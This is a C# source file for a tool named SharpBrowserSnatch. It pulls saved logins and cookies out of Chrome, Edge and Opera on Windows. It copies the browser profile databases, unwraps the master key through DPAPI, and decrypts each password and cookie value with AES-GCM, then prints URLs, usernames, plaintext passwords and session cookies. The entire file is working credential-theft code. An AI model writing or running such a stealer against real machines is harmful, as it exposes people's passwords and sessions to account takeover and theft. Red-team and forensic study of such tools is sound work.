//
//  SharpBrowserSnatch
//
// Package Added: dotnet add package System.Data.SQLite
//                dotnet add package System.Text.Json
//
//
//////////////////// Credits
/////// SQLite
// Using DataTable Class: https://learn.microsoft.com/en-us/dotnet/api/system.data.datatable?view=net-7.0
// Using Data.SQLite: https://learn.microsoft.com/en-us/dotnet/api/microsoft.data.sqlite?view=msdata-sqlite-6.0.0
// Using Data: https://learn.microsoft.com/en-us/dotnet/api/system.data?view=net-7.0
// Example Sqlite: https://stackoverflow.com/questions/26020/what-is-the-best-way-to-connect-and-use-a-sqlite-database-from-c-sharp
//
/////// JSON
// Using Json: https://learn.microsoft.com/en-us/dotnet/api/system.text.json?view=net-7.0
// Using JsonElement.Parse: https://docs.microsoft.com/en-us/dotnet/api/system.text.json.jsonelement.parsevalue?view=net-7.0
// Using GetProperty: https://docs.microsoft.com/en-us/dotnet/api/system.text.json.jsonelement.getproperty?view=net-7.0#system-text-json-jsonelement-getproperty(system-string)
//
////// CryptUnprotectData
// Using CryptUnprotectData: https://learn.microsoft.com/en-us/previous-versions/windows/embedded/ms884634(v=msdn.10)
// Exmple: https://freesilo.com/?p=452
// Example 2: http://www.pinvoke.net/default.aspx/crypt32.cryptunprotectdata
//
/////// AES
// Using AesGcm Class: https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm?view=net-7.0
// Understanding which parts are nonce/iv, cipher, tag: https://github.com/0xfd3/Chrome-Password-Recovery/blob/master/Chromium.cs

using System.Text;
using System.Data;
using System.Data.SQLite;
using System.Text.Json;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Buffers.Binary;

namespace SQLite
{
   class MainClass
   {
      private static bool skipCookies;

      public static void Main(string[] args)
      {
         if (args.Length > 0 && args[0] == "--no-cookies")
         {
            skipCookies = true;
         }
         else 
         {
            skipCookies = false;
         }

         // Set Paths
         string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         string localState =  @"\User Data\Local State";
         string loginData =   @"\User Data\Default\Login Data";
         string cookiesFile = @"\User Data\Default\Network\Cookies";

         // Set Browsers
         var Browsers = new List<string> { @"\Google\Chrome", @"\Microsoft\Edge", @"\opera software\opera stable" };
         // Foreach browser get creds/cookies
         foreach (var B in Browsers)
         {
            Console.WriteLine();
            Console.WriteLine("############ " + B.Replace("\\", " "));
            Console.WriteLine();
            string ls = LocalApplicationData + B + localState;
            string ld = LocalApplicationData + B + loginData;
            string c = LocalApplicationData + B + cookiesFile;

            if (File.Exists(ls) && File.Exists(ld)) // Do File Exists for Cookies???
            {
               GetCreds(ls, ld, c);
            }
         }

      }

////////////////////////////////////////////////////////////////////

      // CryptUnprotectData
      // Wrapper for DPAPI CryptUnprotectData function.
      [DllImport( "crypt32.dll",
                  SetLastError=true,
                  CharSet=System.Runtime.InteropServices.CharSet.Auto)]
      private static extern
          bool CryptUnprotectData(ref DATA_BLOB       pCipherText,
                                  ref string          pszDescription,
                                  ref DATA_BLOB       pEntropy,
                                      IntPtr          pReserved,
                                  ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
                                      int             dwFlags,
                                  ref DATA_BLOB       pPlainText);

      // BLOB structure used to pass data to DPAPI functions.
      [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
      internal struct DATA_BLOB
      {
          public int     cbData;
          public IntPtr  pbData;
      }

      // Prompt structure to be used for required parameters.
      [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
      internal struct CRYPTPROTECT_PROMPTSTRUCT
      {
          public int      cbSize;
          public int      dwPromptFlags;
          public IntPtr   hwndApp;
          public string   szPrompt;
      }

      // Wrapper for the NULL handle or pointer.
      static private IntPtr NullPtr = ((IntPtr)((int)(0)));

      // DPAPI key initialization flags.
      private const int CRYPTPROTECT_UI_FORBIDDEN  = 0x1;
      private const int CRYPTPROTECT_LOCAL_MACHINE = 0x4;


      // Get Key, Get data from db, Decrypt creds/cookies
      private static void GetCreds(string ls, string ld, string c)
      {
         string localState = "Local State";
         string loginData  = "Login Data";
         System.IO.File.Copy(ls, localState, true);
         System.IO.File.Copy(ld, loginData, true);

         // Setup for extracting url, username, and passwd
         loginData = "Data Source=Login Data"; //


         DataTable dt = new DataTable();
         // action_url could be added
         string query = "select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
//         string query = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";

         // Setup for extracting data for AES GCM
         string jsonString = File.ReadAllText(localState);
         var jsonStringParsed = JsonDocument.Parse(jsonString);
         var os_cryptJSON = jsonStringParsed.RootElement.GetProperty("os_crypt");
         JsonElement encrypted_keyJSON = os_cryptJSON.GetProperty("encrypted_key");

         byte[] encrypted_keyBytes = System.Convert.FromBase64String(encrypted_keyJSON.ToString());
         byte[] encrypted_key = GetPartOfByteArray(ref encrypted_keyBytes, 5, encrypted_keyBytes.Length - 1);

         // CryptUnprotectData
         byte[] entropy = new byte[0];
         string description;
         byte[] key = Decrypt(encrypted_key, entropy, out description);   

         // Get credentials
         QueryDatabase(query, loginData, ref dt);
         ShowUserPasswdValues(dt, key);

         // Cookies
         if (!skipCookies)
         {
            string cookieFile = "Cookies";
            System.IO.File.Copy(c, cookieFile, true);
            query = "select host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value from cookies";
            cookieFile = "Data Source=Cookies";

            QueryDatabase(query, cookieFile, ref dt);
            ShowCookieValues(dt, key);
         }
      }


      // Query 'Login Data' SQLite file
      private static void QueryDatabase(string query, string loginData, ref DataTable dt)
      {
         SQLiteDataAdapter ad;
         SQLiteConnection sqlite = new SQLiteConnection(loginData);

         try
         {
            SQLiteCommand cmd;
            sqlite.Open();
            cmd = sqlite.CreateCommand();
            cmd.CommandText = query;
            ad = new SQLiteDataAdapter(cmd);
            ad.Fill(dt);
         }
         catch (SQLiteException e)
         {
            Console.WriteLine($"Error: {0}", e);
         }

         sqlite.Close();
      }

      // Get part of byte array, specify start and finish ... could just use Array.Copy()
      private static byte[] GetPartOfByteArray(ref byte[] source, int start, int end)                                    
      {
         byte[] build = new byte[(end - start) + 1];
         int i = 0;

         if (start >= 0 && start <= source.Length)
         {
            if (end >= 0 && end <= source.Length)
            {
               for (; start <= end; start++)
               {
                  build[i++] = source[start];
               }
               return build;
            }
         }
         return null;
      }


      // Show Credential values
      private static void ShowUserPasswdValues(DataTable table, byte[] key)
      {
         Console.WriteLine("# # # Credentials:");

         // Make AesGCM object with key
         var aesObj = new AesGcmHelper(key);

         // Get Values
         foreach (DataRow row in table.Rows)
         {
            foreach (DataColumn col in table.Columns)
            {
               if (col.ColumnName == "origin_url")
               {
                  Console.WriteLine("[+] " + row[col]);
               }
               else if (col.ColumnName == "username_value")
               {
                  Console.Write("U|P: " + row[col] + " : ");
               }
               else if (col.ColumnName == "password_value")
               {
                  // Holds password value
                  byte[] b = (byte[])row[col];

                  // Extract passwd
                  byte[] passwd = GetPartOfByteArray(ref b, 15, (b.Length - 1) - 16);

                  // Extract iv
                  byte[] iv = GetPartOfByteArray(ref b, 3, (15 - 1));

		            // Extract Tag
		            byte[] tag = GetPartOfByteArray(ref b, (b.Length) - 16, (b.Length - 1));

                  // Pass to AES Decrypt
                  Console.WriteLine(aesObj.AesDecrypt(passwd, iv, tag));
               }
               else if (col.ColumnName == "date_created")
               {
                  // Time since (1/1/1601) in ms: Example: 13321407177797782
                  Console.WriteLine("Date Created: " + row[col]);

                  // With dotnet Version 7 this would work
//                  DateTime dt = DateTime.Now;
//                  dt.AddMicroseconds(row[col]);
//                  Console.WriteLine("Date Converted: " + dt.ToString());

               }
               else if (col.ColumnName == "date_last_used")
               {
                  Console.WriteLine("Date Last Used: " + row[col]);
               }
            }
            Console.WriteLine();
         }

         aesObj.Dispose();
      }

      // Show Cookie Values
      private static void ShowCookieValues(DataTable table, byte[] key)
      {
         Console.WriteLine("# # # Cookies:");

         // Make AesGCM object with key
         var aesObj = new AesGcmHelper(key);

         // Get Values
         foreach (DataRow row in table.Rows)
         {
            foreach (DataColumn col in table.Columns)
            {
               if (col.ColumnName == "host_key")
               {
                  if (row[col] == System.DBNull.Value)
                  {
                     Console.WriteLine("[-] Empty");
                     break;
                  }
                  Console.WriteLine("[+] " + row[col]);
               }
               else if (col.ColumnName == "name")
               {
                  Console.WriteLine("name: " + row[col]);
               }
               else if (col.ColumnName == "creation_utc")
               {
                  Console.WriteLine("creation utc: " + row[col]);
               }
               else if (col.ColumnName == "last_access")
               {
                  Console.WriteLine("last access: " + row[col]);
               }
               else if (col.ColumnName == "expires_utc")
               {
                  Console.WriteLine("expires utc: " + row[col]);
               }
               else if (col.ColumnName == "encrypted_value")
               {
                  Console.Write("cookie: ");
                  // Holds cookie value

                  try 
                  {
//                  Console.WriteLine("ecncrypted cookie: Type" + row[col].GetType());
                  byte[] b = (byte[])row[col];  /// ERROR , CAST

                  // Extract cookie
                  byte[] cookie = GetPartOfByteArray(ref b, 15, (b.Length - 1) - 16);
                  // Extract iv
                  byte[] iv = GetPartOfByteArray(ref b, 3, (15 - 1));

                  // Extract Tag
                  byte[] tag = GetPartOfByteArray(ref b, (b.Length) - 16, (b.Length - 1));

                  // Pass to AES Decrypt
                  Console.WriteLine(aesObj.AesDecrypt(cookie, iv, tag));
                  }
                  catch (Exception e)
                  {
                     Console.WriteLine($"Error: {0}", e);
                  }

               }
            }
            Console.WriteLine();
         }
         aesObj.Dispose();
      }

      //////////// CryptUnprotectData Stuff
      //
      private static void InitPrompt(ref CRYPTPROTECT_PROMPTSTRUCT ps)
      {
          ps.cbSize       = Marshal.SizeOf(
                                   typeof(CRYPTPROTECT_PROMPTSTRUCT));
          ps.dwPromptFlags= 0;
          ps.hwndApp      = NullPtr;
          ps.szPrompt     = null;
      }

      //
      private static void InitBLOB(byte[] data, ref DATA_BLOB blob)
      {
          // Use empty array for null parameter.
          if (data == null)
              data = new byte[0];

          // Allocate memory for the BLOB data.
          blob.pbData = Marshal.AllocHGlobal(data.Length);

          // Make sure that memory allocation was successful.
          if (blob.pbData == IntPtr.Zero)
              throw new Exception(
                  "Unable to allocate data buffer for BLOB structure.");

          // Specify number of bytes in the BLOB.
          blob.cbData = data.Length;

          // Copy data from original source to the BLOB structure.
          Marshal.Copy(data, 0, blob.pbData, data.Length);
      }

      //
      private static byte[] Decrypt(    byte[] cipherTextBytes,
                                     byte[] entropyBytes,
                                 out string description)
      {
        // Create BLOBs to hold data.
        DATA_BLOB plainTextBlob  = new DATA_BLOB();
        DATA_BLOB cipherTextBlob = new DATA_BLOB();
        DATA_BLOB entropyBlob    = new DATA_BLOB();

        // We only need prompt structure because it is a required
        // parameter.
        CRYPTPROTECT_PROMPTSTRUCT prompt =
                                  new CRYPTPROTECT_PROMPTSTRUCT();
        InitPrompt(ref prompt);

        // Initialize description string.
        description = String.Empty;

        try
        {
            // Convert ciphertext bytes into a BLOB structure.
            try
            {
                InitBLOB(cipherTextBytes, ref cipherTextBlob);
            }
            catch (Exception ex)
            {
                throw new Exception(
                    "Cannot initialize ciphertext BLOB.", ex);
            }

            // Convert entropy bytes into a BLOB structure.
            try
            {
                InitBLOB(entropyBytes, ref entropyBlob);
            }
            catch (Exception ex)
            {
                throw new Exception(
                    "Cannot initialize entropy BLOB.", ex);
            }

            // Disable any types of UI. CryptUnprotectData does not
            // mention CRYPTPROTECT_LOCAL_MACHINE flag in the list of
            // supported flags so we will not set it up.
            int flags = CRYPTPROTECT_UI_FORBIDDEN;

            // Call DPAPI to decrypt data.
            bool success = CryptUnprotectData(ref cipherTextBlob,
                                              ref description,
                                              ref entropyBlob,
                                                  IntPtr.Zero,
                                              ref prompt,
                                                  flags,
                                              ref plainTextBlob);

            // Check the result.
            if (!success)
            {
                // If operation failed, retrieve last Win32 error.
                int errCode = Marshal.GetLastWin32Error();

                // Win32Exception will contain error message corresponding
                // to the Windows error code.
                Console.WriteLine("CryptUnprotectData Failed with error code: " + errCode);
//                throw new Exception("CryptUnprotectData failed.", new Win32Exception(errCode));
            }

            // Allocate memory to hold plaintext.
            byte[] plainTextBytes = new byte[plainTextBlob.cbData];

            // Copy ciphertext from the BLOB to a byte array.
            Marshal.Copy(plainTextBlob.pbData,
                         plainTextBytes,
                         0,
                         plainTextBlob.cbData);

            // Return the result.
            return plainTextBytes;
        }
        catch (Exception ex)
        {
            throw new Exception("DPAPI was unable to decrypt data.", ex);
        }
        // Free all memory allocated for BLOBs.
        finally
        {
            if (plainTextBlob.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(plainTextBlob.pbData);

            if (cipherTextBlob.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(cipherTextBlob.pbData);

            if (entropyBlob.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(entropyBlob.pbData);
        }
    }
   }

   // AES GCM Class
   class AesGcmHelper : IDisposable
   {
      // AesGcm
      private readonly AesGcm _aes;

      public AesGcmHelper(byte[] key)
      {
         _aes = new AesGcm(key);
      }

      public void Dispose()
      {
         _aes.Dispose();
      }

      public string AesDecrypt(byte[] passwd, byte[] iv, byte[] tag)
      {
         try
         {
            // nonce = iv
            // tag
            // cipherText = passwd (encrypted data)
            // plainText
//         byte[] nonce = new byte[12]; // also known as IV apparently
//         byte[] tag = new byte[passwd.Length - 3 - nonce.Length];
//         byte[] cipherText = passwd;
         byte[] plainText = new byte[passwd.Length];

//         Array.Copy(passwd, 3, nonce, 0, nonce.Length);
//         Array.Copy(passwd, 3 + nonce.Length, tag, 0, tag.Length);

//	Console.WriteLine("AES GCM Decrypt");
//         _aes.Decrypt(nonce, cipherText, tag, plainText);
         _aes.Decrypt(iv, passwd, tag, plainText);

//         string hexB = BitConverter.ToString(plainText);
//         Console.WriteLine(hexB.Replace("-", ""));
//         Console.WriteLine("Decrypted Password: " + hexB);
//	 Console.WriteLine(Encoding.UTF8.GetString(plainText));

            return Encoding.UTF8.GetString(plainText);
         }
         catch (Exception err)
         {
            Console.WriteLine("[-] Error: " + err);
            return null;
         }
      }

   }

}

